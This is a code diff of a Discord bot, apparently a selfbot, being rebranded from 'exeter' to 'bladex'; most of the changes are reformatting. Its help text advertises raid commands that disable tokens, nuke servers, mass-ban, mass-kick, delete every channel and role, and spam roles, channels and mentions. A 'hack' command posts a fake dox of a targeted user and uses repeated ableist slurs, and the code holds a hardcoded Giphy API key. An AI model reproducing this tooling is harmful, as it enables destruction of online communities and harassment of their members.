+        embed.description = f"\uD83E\uDDDB **xans**\n`➫ Tokenfuck <token>` - ***✗ Disables the token ✗***\n`➫ Nuke` - ***✗ Nukes the server ✗***\n`➫ Massban` - ***✗ Bans everyone in the server ✗***\n`➫ Dynoban` - ***✗ Mass bans with dyno one message at a time ✗***\n`➫ Masskick` - ***✗ Kicks everyone in the server ✗***\n`➫ Spamroles` - ***✗ Spam makes 250 roles ✗***\n`➫ Spamchannels` - ***✗ Spam makes 250 text channels ✗***\n`➫ Delchannels` - ***✗ Deletes all channels in the server ✗***\n`➫ Delroles` - ***✗ Deletes all roles in the server ✗***\n`➫ Purgebans` - ***✗ Unbans everyone ✗***\n`➫ Renamechannels <name>` - ***✗ Renames all channels ✗***\n`➫ Servername <name>` - ***✗ Renames the server to the specified name ✗***\n`➫ Nickall <name>` - ***✗ Sets all user's nicknames to the specified name ✗***\n`➫ Changeregion <amount>` - ***✗ Spam changes regions in groupchats ✗***\n`➫ Kickgc` - ***✗ Kicks everyone in the gc ✗***\n`➫ Spamgcname` - ***✗ Spam changes the groupchat name ✗***\n`➫ Massmention <message>` - ***✗ Mass mentions random people ✗***"
         await ctx.send(embed=embed)
 
 
@@ -878,7 +1002,6 @@ async def help(ctx, category=None):
 
 # MUSIC
 
-
 # NSFW
 
 # MISC
@@ -889,34 +1012,44 @@ async def help(ctx, category=None):
 
 
 @xans.command()
-async def exeter(ctx):
+async def bladx(ctx):
     await ctx.message.delete()
     await ctx.send("""
-███████╗  ██╗      ██╗  ███████╗ ████████╗ ███████╗ ██████╗
-██╔════╝  ╚██╗██╔╝  ██╔════╝╚══██╔══╝  ██╔════╝ ██╔══██╗
-█████╗           ╚███╔╝     █████╗                ██║           █████╗        ██████╔╝
-██╔══╝           ██╔██╗     ██╔══╝                ██║           ██╔══╝        ██╔══██╗
-███████╗   ██╔╝ ██╗   ███████╗         ██║           ███████╗  ██║      ██║
-╚══════╝  ╚═╝     ╚═╝   ╚══════╝         ╚═╝           ╚══════╝  ╚═╝      ╚═╝
+```▄▄▄▄    ██▓    ▄▄▄      ▓█████▄ ▓█████ ▒██   ██▒
+▓█████▄ ▓██▒   ▒████▄    ▒██▀ ██▌▓█   ▀ ▒▒ █ █ ▒░
+▒██▒ ▄██▒██░   ▒██  ▀█▄  ░██   █▌▒███   ░░  █   ░
+▒██░█▀  ▒██░   ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄  ░ █ █ ▒ 
+░▓█  ▀█▓░██████▒▓█   ▓██▒░▒████▓ ░▒████▒▒██▒ ▒██▒
+░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░
+▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░░   ░▒ ░
+ ░    ░   ░ ░    ░   ▒    ░ ░  ░    ░    ░    ░  
+ ░          ░  ░     ░  ░   ░       ░  ░ ░    ░  
+      ░                   ░                      ```
 """)
+
 
 
 @xans.command(aliases=["giphy", "tenor", "searchgif"])
 async def gif(ctx, query=None):
     await ctx.message.delete()
     if query is None:
-        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
+        r = requests.get(
+            "https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R"
+        )
         res = r.json()
         await ctx.send(res['data']['url'])
 
     else:
         r = requests.get(
-            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
+            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en"
+        )
         res = r.json()
         await ctx.send(res['data'][0]["url"])
 
+  
 
-@xans.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
+@xans.command(
+    aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
 async def image(ctx, *, args):
     await ctx.message.delete()
     url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
@@ -930,7 +1063,9 @@ async def image(ctx, *, args):
                 async with session.get(link) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"exeter_anal.png"))
+                await ctx.send(
+                    f"Search result for: **{args}**",
+                    file=discord.File(file, f"bladex_anal.png"))
         except:
             await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
     else:
@@ -1102,30 +1237,68 @@ async def genname(ctx):
     await ctx.send(discord.utils.escape_mentions(second + first))
 
 
-@xans.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
+@xans.command(
+    aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
 async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
     await ctx.message.delete()
     r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
     geo = r.json()
     em = discord.Embed()
     fields = [
-        {'name': 'IP', 'value': geo['query']},
-        {'name': 'Type', 'value': geo['ipType']},
-        {'name': 'Country', 'value': geo['country']},
-        {'name': 'City', 'value': geo['city']},
-        {'name': 'Continent', 'value': geo['continent']},
-        {'name': 'Country', 'value': geo['country']},
-        {'name': 'Hostname', 'value': geo['ipName']},
-        {'name': 'ISP', 'value': geo['isp']},
-        {'name': 'Latitute', 'value': geo['lat']},
-        {'name': 'Longitude', 'value': geo['lon']},
-        {'name': 'Org', 'value': geo['org']},
-        {'name': 'Region', 'value': geo['region']},
+        {
+            'name': 'IP',
+            'value': geo['query']
+        },
+        {
+            'name': 'Type',
+            'value': geo['ipType']
+        },
+        {
+            'name': 'Country',
+            'value': geo['country']
+        },
+        {
+            'name': 'City',
+            'value': geo['city']
+        },
+        {
+            'name': 'Continent',
+            'value': geo['continent']
+        },
+        {
+            'name': 'Country',
+            'value': geo['country']
+        },
+        {
+            'name': 'Hostname',
+            'value': geo['ipName']
+        },
+        {
+            'name': 'ISP',
+            'value': geo['isp']
+        },
+        {
+            'name': 'Latitute',
+            'value': geo['lat']
+        },
+        {
+            'name': 'Longitude',
+            'value': geo['lon']
+        },
+        {
+            'name': 'Org',
+            'value': geo['org']
+        },
+        {
+            'name': 'Region',
+            'value': geo['region']
+        },
     ]
     for field in fields:
         if field['value']:
             em.add_field(name=field['name'], value=field['value'], inline=True)
     return await ctx.send(embed=em)
+
 
 @xans.command()
 async def pingweb(ctx, website=None):
@@ -1150,14 +1323,17 @@ async def tweet(ctx, username: str = None, *, message: str = None):
         await ctx.send("missing parameters")
         return
     async with aiohttp.ClientSession() as cs:
-        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
+        async with cs.get(
+                f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}"
+        ) as r:
             res = await r.json()
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(str(res['message'])) as resp:
                         image = await resp.read()
                 with io.BytesIO(image) as file:
-                    await ctx.send(file=discord.File(file, f"exeter_tweet.png"))
+                    await ctx.send(
+                        file=discord.File(file, f"bladex_tweet.png"))
             except:
                 await ctx.send(res['message'])
 
@@ -1176,7 +1352,7 @@ async def magik(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
+                await ctx.send(file=discord.File(file, f"bladex_magik.png"))
         except:
             await ctx.send(res['message'])
     else:
@@ -1189,7 +1365,7 @@ async def magik(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
+                await ctx.send(file=discord.File(file, f"bladex_magik.png"))
         except:
             await ctx.send(res['message'])
 
@@ -1215,7 +1391,7 @@ async def fry(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
+                await ctx.send(file=discord.File(file, f"bladex_fry.png"))
         except:
             await ctx.send(res['message'])
     else:
@@ -1228,7 +1404,7 @@ async def fry(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
+                await ctx.send(file=discord.File(file, f"bladex_fry.png"))
         except:
             await ctx.send(res['message'])
 
@@ -1245,7 +1421,7 @@ async def blur(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blur.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1256,11 +1432,11 @@ async def blur(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blur.png"))
         except:
             await ctx.send(endpoint)
 
-
+ 
 @xans.command(aliases=["pixel"])
 async def pixelate(ctx, user: discord.Member = None):
     await ctx.message.delete()
@@ -1273,7 +1449,7 @@ async def pixelate(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blur.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1284,7 +1460,7 @@ async def pixelate(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blur.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1295,13 +1471,14 @@ async def supreme(ctx, *, args=None):
     if args is None:
         await ctx.send("missing parameters")
         return
-    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
+    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(
+        " ", "%20")
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(endpoint) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_supreme.png"))
+            await ctx.send(file=discord.File(file, f"bladex_supreme.png"))
     except:
         await ctx.send(endpoint)
 
@@ -1312,13 +1489,14 @@ async def darksupreme(ctx, *, args=None):
     if args is None:
         await ctx.send("missing parameters")
         return
-    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
+    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(
+        " ", "%20") + "&dark=true"
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(endpoint) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_dark_supreme.png"))
+            await ctx.send(file=discord.File(file, f"bladex_dark_supreme.png"))
     except:
         await ctx.send(endpoint)
 
@@ -1329,13 +1507,14 @@ async def fax(ctx, *, args=None):
     if args is None:
         await ctx.send("missing parameters")
         return
-    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
+    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(
+        " ", "%20")
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(endpoint) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_facts.png"))
+            await ctx.send(file=discord.File(file, f"bladex_facts.png"))
     except:
         await ctx.send(endpoint)
 
@@ -1354,7 +1533,7 @@ async def blurpify(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blurpify.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blurpify.png"))
         except:
             await ctx.send(res['message'])
     else:
@@ -1367,7 +1546,7 @@ async def blurpify(ctx, user: discord.Member = None):
                 async with session.get(str(res['message'])) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_blurpify.png"))
+                await ctx.send(file=discord.File(file, f"bladex_blurpify.png"))
         except:
             await ctx.send(res['message'])
 
@@ -1384,7 +1563,7 @@ async def invert(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1395,7 +1574,7 @@ async def invert(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1412,7 +1591,7 @@ async def gay(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1423,7 +1602,7 @@ async def gay(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1440,7 +1619,7 @@ async def communist(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1451,7 +1630,7 @@ async def communist(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1468,7 +1647,7 @@ async def snow(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1479,7 +1658,7 @@ async def snow(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1496,7 +1675,7 @@ async def jpegify(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
     else:
@@ -1507,7 +1686,7 @@ async def jpegify(ctx, user: discord.Member = None):
                 async with session.get(endpoint) as resp:
                     image = await resp.read()
             with io.BytesIO(image) as file:
-                await ctx.send(file=discord.File(file, f"exeter_invert.png"))
+                await ctx.send(file=discord.File(file, f"bladex_invert.png"))
         except:
             await ctx.send(endpoint)
 
@@ -1518,14 +1697,14 @@ async def pornhub(ctx, word1=None, word2=None):
     if word1 is None or word2 is None:
         await ctx.send("missing parameters")
         return
-    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
-        "{text-2}", word2)
+    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace(
+        "{text-1}", word1).replace("{text-2}", word2)
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(endpoint) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_pornhub_logo.png"))
+            await ctx.send(file=discord.File(file, f"bladex_pornhub_logo.png"))
     except:
         await ctx.send(endpoint)
 
@@ -1545,7 +1724,8 @@ async def phcomment(ctx, user: str = None, *, args=None):
             async with session.get(res["message"]) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_pornhub_comment.png"))
+            await ctx.send(
+                file=discord.File(file, f"bladex_pornhub_comment.png"))
     except:
         await ctx.send(res["message"])
 
@@ -1553,10 +1733,13 @@ async def phcomment(ctx, user: str = None, *, args=None):
 @xans.command()
 async def token(ctx, user: discord.Member = None):
     await ctx.message.delete()
-    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
-            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
-            'p', 'q', 'r', 's', 't', 'u',
-            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+    list = [
+        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
+        "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_"
+        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+        'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0',
+        '1', '2', '3', '4', '5', '6', '7', '8', '9'
+    ]
     token = random.choices(list, k=59)
     print(token)
     if user is None:
@@ -1571,92 +1754,156 @@ async def hack(ctx, user: discord.Member = None):
     await ctx.message.delete()
     gender = ["Male", "Female", "Trans", "Other", "Retard"]
     age = str(random.randrange(10, 25))
-    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
-              '5\'4\"', '5\'5\"',
-              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
-              '6\'4\"', '6\'5\"',
-              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
+    height = [
+        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
+        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
+        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
+        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
+        '6\'10\"', '6\'11\"'
+    ]
     weight = str(random.randrange(60, 300))
     hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
     skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
-    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
-    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
-    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
-                 "Retard never went to school LOL"]
-    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
-                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
-    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
-                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
-                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
-                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
-    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
-              "$125,000", "$150,000", "$175,000",
-              "$200,000+"]
-    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
-                "Russia", "Pakistan", "India",
-                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
-                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
-                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
-                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
-                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
-                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
-                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
-    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
-             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
+    religion = [
+        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
+    ]
+    sexuality = [
+        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
+    ]
+    education = [
+        "High School", "College", "Middle School", "Elementary School",
+        "Pre School", "Retard never went to school LOL"
+    ]
+    ethnicity = [
+        "White", "African American", "Asian", "Latino", "Latina", "American",
+        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
+        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
+    ]
+    occupation = [
+        "Retard has no job LOL", "Certified discord retard", "Janitor",
+        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
+        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
+        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
+        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
+        "Programmer", "Software Engineer", "Scientist"
+    ]
+    salary = [
+        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
+        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
+        "$200,000+"
+    ]
+    location = [
+        "Retard lives in his mom's basement LOL", "America", "United States",
+        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
+        "Some random third world country", "Canada", "Alabama", "Alaska",
+        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
+        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
+        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
+        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
+        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
+        "New Jersey", "New Mexico", "New York", "North Carolina",
+        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
+        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
+        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
+        "Wisconsin", "Wyoming"
+    ]
+    email = [
+        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
+        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
+        "@icloud.com", "@gmx.net", "@yandex.com"
+    ]
     dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
-    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
-            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
-            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
-            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
-            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
-            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
-            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
-            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
-            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
+    name = [
+        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
+        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
+        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
+        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
+        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
+        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
+        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
+        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
+        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
+        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
+        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
+        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
+        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
+    ]
     phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
     if user is None:
         user = ctx.author
-        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
-                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
-                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
+        password = [
+            'password', '123', 'mypasswordispassword', user.name + "iscool123",
+            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
+            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
+            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
+            "ilovefurries"
+        ]
         message = await ctx.send(f"`Hacking {user}...\n`")
         await asyncio.sleep(1)
-        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
-        await asyncio.sleep(1)
-        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
+        await message.edit(
+            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
+        )
+        await asyncio.sleep(1)
+        await message.edit(
+            content=
+            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
+        )
     else:
